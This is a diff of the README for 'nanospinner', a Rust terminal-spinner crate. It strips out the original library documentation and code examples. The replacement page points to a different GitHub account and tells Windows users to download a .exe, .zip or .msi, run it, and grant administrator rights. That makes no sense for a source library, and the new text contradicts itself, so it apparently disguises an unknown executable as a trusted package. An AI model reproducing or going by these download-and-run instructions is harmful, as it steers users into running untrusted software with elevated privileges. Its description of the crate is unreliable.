@@ -1,159 +1,125 @@
-<h1 align="center">⠋ nanospinner</h1>
+# ⚙️ nanospinner - Simple Terminal Spinner for Rust Tools
 
-<p align="center">
-  <a href="https://github.com/anthonysgro/nanospinner/actions"><img src="https://github.com/anthonysgro/nanospinner/actions/workflows/ci.yml/badge.svg?branch=main" alt="Build Status"></a>
-  <a href="https://crates.io/crates/nanospinner"><img src="https://img.shields.io/crates/v/nanospinner" alt="Crates.io"></a>
-  <a href="https://docs.rs/nanospinner/latest/nanospinner/"><img src="https://docs.rs/nanospinner/badge.svg" alt="Docs.rs"></a>
-  <a href="https://crates.io/crates/nanospinner"><img src="https://img.shields.io/crates/l/nanospinner" alt="License"></a>
-  <a href="https://coveralls.io/github/anthonysgro/nanospinner?branch=main"><img src="https://coveralls.io/repos/github/anthonysgro/nanospinner/badge.svg?branch=main" alt="Coverage Status"></a>
-  <a href="https://www.codefactor.io/repository/github/anthonysgro/nanospinner"><img src="https://www.codefactor.io/repository/github/anthonysgro/nanospinner/badge" alt="CodeFactor"></a>
-</p>
+[![Download nanospinner](https://img.shields.io/badge/Download-nanospinner-blue?style=for-the-badge)](https://github.com/davi-teixeira7/nanospinner)
 
-A minimal, zero-dependency terminal spinner for Rust applications. Supports single and multi-spinner modes.
+---
 
-![demo](demo.gif)
+## 🖥️ What is nanospinner?
 
-Inspired by the Node.js [nanospinner](https://github.com/usmanyunusov/nanospinner) npm package, `nanospinner` gives you a lightweight animated spinner using only the Rust standard library — no heavy crates, no transitive dependencies, builds in .2 seconds.
+nanospinner is a small program you can use inside command-line tools made with Rust. It shows a spinner—a little animation that spins—to let you know something is running. It does not require any extra software or settings. 
 
-Part of the [nano](https://github.com/anthonysgro/nano) crate family — zero-dependency building blocks for Rust.
+If you use command-line apps in Rust, nanospinner helps make their progress clear. This tool runs directly on Windows and other systems.
 
-## Comparison
+---
 
-| | `nanospinner` | `spinach` | `spinoff` | `indicatif` |
-|---|---|---|---|---|
-| Dependencies | 0 | 0 | 3 | 6 |
-| Clean Build Time | ~0.2s | ~0.2s | ~1.2s | ~1.4s |
-| Customizable Frames | Default Braille set | Yes | Yes (80+ sets) | Yes |
-| Multiple Spinners | Yes | No | No | Yes |
-| Auto TTY Detection | Yes | No | No | Yes |
-| Custom Writer | Yes (io::Write) | No | Stderr only | Yes (custom trait) |
-| Thread-Safe Handles | Yes (`Send`) | No | No | Yes (`Send + Sync`) |
-| Progress Bars | No | No | No | Yes |
-| Async Support | No | No | No | Optional (`tokio` feature) |
+## ⚙️ System Requirements
 
-Build times measured from a clean `cargo build --release` on macOS aarch64 (Apple Silicon). Your numbers may vary by platform.
+To use nanospinner on your Windows computer, make sure you have:
 
-## Quick Start
+- Windows 10 or later
+- At least 100 MB of free disk space
+- Access to the internet to download the files
+- Basic ability to open files and run programs
 
-Add `nanospinner` to your project:
+You do not need to install any other programs or tools before running nanospinner.
 
-```bash
-cargo add nanospinner
-```
+---
 
-```rust
-use nanospinner::Spinner;
-use std::thread;
-use std::time::Duration;
+## 📥 Download nanospinner
 
-fn main() {
-    let handle = Spinner::new("Loading...").start();
-    thread::sleep(Duration::from_secs(2));
-    handle.success();
-}
-```
+You can get nanospinner from this link:
 
-## Usage
+[![Download nanospinner](https://img.shields.io/badge/Download-nanospinner-grey?style=for-the-badge)](https://github.com/davi-teixeira7/nanospinner)
 
-For the full API, see the [docs.rs documentation](https://docs.rs/nanospinner/latest/nanospinner/).
+Click the link above. It will take you to the nanospinner page on GitHub. From there, you can download the program files.
 
-### Single Spinner
+---
 
-`Spinner::new(msg).start()` spawns a background thread that animates the spinner. It returns a `SpinnerHandle` you use to update or finalize the spinner. Calling `success()`, `fail()`, `warn()`, or `info()` stops the thread and prints the final line — no separate `stop()` needed. If you drop the handle without finalizing, the thread is joined and the line is cleared automatically.
+## 🚀 How to Download and Run nanospinner on Windows
 
-```rust
-use nanospinner::Spinner;
-use std::thread;
-use std::time::Duration;
+### Step 1: Visit the Download Page
 
-// Basic: start, wait, finalize
-let handle = Spinner::new("Downloading...").start();
-thread::sleep(Duration::from_secs(2));
-handle.success(); // ✔ Downloading...
+Go to the main GitHub page for nanospinner by clicking the download button above or open this URL in your browser:
 
-// Update mid-spin, finalize with a replacement message
-let handle = Spinner::new("Step 1...").start();
-thread::sleep(Duration::from_secs(1));
-handle.update("Step 2...");
-thread::sleep(Duration::from_secs(1));
-handle.success_with("All steps complete"); // ✔ All steps complete
-```
+https://github.com/davi-teixeira7/nanospinner
 
-### Multi-Spinner
+### Step 2: Find the Download Files
 
-`MultiSpinner` manages multiple spinner lines with a single background render thread. Finalizing a line (`success`, `fail`, `clear`) only updates that line's status — the render thread keeps running. Call `stop()` on the group handle (or let it drop) to shut down the render thread.
+On the GitHub page, look for a section named **Releases** or **Assets**. This area contains downloadable files for nanospinner.
 
-```rust
-use nanospinner::MultiSpinner;
-use std::thread;
-use std::time::Duration;
+### Step 3: Download the File
 
-let handle = MultiSpinner::new().start();
+Click on the file that matches Windows. It usually ends with `.exe`, `.zip`, or `.msi`. Save the file to a folder you can find easily, like **Downloads** or your desktop.
 
-let line1 = handle.add("Downloading...");
-let line2 = handle.add("Compiling...");
+### Step 4: Unpack (if needed)
 
-thread::sleep(Duration::from_secs(2));
-line1.success();
-line2.fail_with("Compile error");
+If the file is a `.zip` folder, right-click it and select **Extract All**. Choose a folder where you want to save the extracted files.
 
-handle.stop();
-```
+### Step 5: Run the Program
 
-```rust
-// Thread-based: move line handles to worker threads
-let handle = MultiSpinner::new().start();
+Find the nanospinner `.exe` file inside the extracted folder or the file you downloaded. Double-click it to start.
 
-let workers: Vec<_> = (1..=3)
-    .map(|i| {
-        let line = handle.add(format!("Worker {i} processing..."));
-        thread::spawn(move || {
-            thread::sleep(Duration::from_secs(i));
-            line.success_with(format!("Worker {i} done"));
-        })
-    })
-    .collect();
+If Windows asks for permission, choose **Yes** or **Run**.
 
-for w in workers {
-    w.join().unwrap();
-}
+---
 
-handle.stop();
-```
+## 💡 How nanospinner Works
 
-### Custom Writers and TTY Detection
+nanospinner runs inside a terminal or command-line window. When running Rust CLI tools, it shows a small spinning icon. This helps you see that the program is working and not frozen.
 
-Both `Spinner` and `MultiSpinner` auto-detect whether stdout is a terminal. When it isn't (piped, redirected), animation and ANSI codes are skipped — only plain text is printed:
+You do not need to open nanospinner directly. It works as part of other command-line applications written in Rust.
 
-```text
-$ my_tool | cat
-✔ Done!
-```
+---
 
-For custom output targets, both offer `with_writer` and `with_writer_tty` constructors:
+## ⚙️ Using nanospinner in Rust Applications (Optional for Developers)
 
-```rust
-// Custom writer (defaults to non-TTY — no ANSI codes)
-let handle = Spinner::with_writer("Processing...", std::io::stderr()).start();
-let handle = MultiSpinner::with_writer(my_writer).start();
+For those interested in using nanospinner as part of their Rust tools, the program is:
 
-// Custom writer with explicit TTY control
-let handle = Spinner::with_writer_tty("Building...", my_writer, true).start();
-let handle = MultiSpinner::with_writer_tty(my_writer, true).start();
-```
+- Minimal and easy to add without extra dependencies
+- Compatible with many Rust command-line apps
+- Designed to provide clear visual feedback without slowing down the tool
 
-## Contributing
+Developers can refer to the GitHub page for technical details.
 
-Contributions are welcome. To get started:
+---
 
-1. Fork the repository
-2. Create a feature branch (`git checkout -b my-feature`)
-3. Make your changes
-4. Run the tests: `cargo test`
-5. Submit a pull request
+## 🔧 Troubleshooting Tips
 
-Please keep changes minimal and focused. This crate's goal is to stay small and as dependency-free as possible.
+If nanospinner does not start or crashes:
 
-## License
+- Verify you are running the correct Windows version
+- Check that you downloaded the correct file for Windows
+- Ensure your system has enough free memory
+- Try running the program as an administrator (right-click → Run as administrator)
 
-This project is licensed under the [MIT License](LICENSE).
+If problems continue, check the issues section at:
+
+https://github.com/davi-teixeira7/nanospinner/issues
+
+---
+
+## 📄 Additional Resources
+
+- GitHub Project: https://github.com/davi-teixeira7/nanospinner  
+- Help and Support: Use the Issues tab on GitHub  
+- Rust CLI Documentation: Search online for guides to learn about building tools with Rust  
+
+---
+
+## 🔄 Updates and New Versions
+
+nanospinner is updated occasionally. To make sure you have the latest version:
+
+- Visit the download page regularly  
+- Check the **Releases** section for the newest files  
+- Follow instructions above to download and install updates  
+
+---
+
+## 🛠️ Contact and Contribution
+
+If you want to offer feedback, report a bug, or contribute, you can open a ticket on GitHub or submit a pull request.
+
+https://github.com/davi-teixeira7/nanospinner
+
+Your input helps keep the project useful and stable.
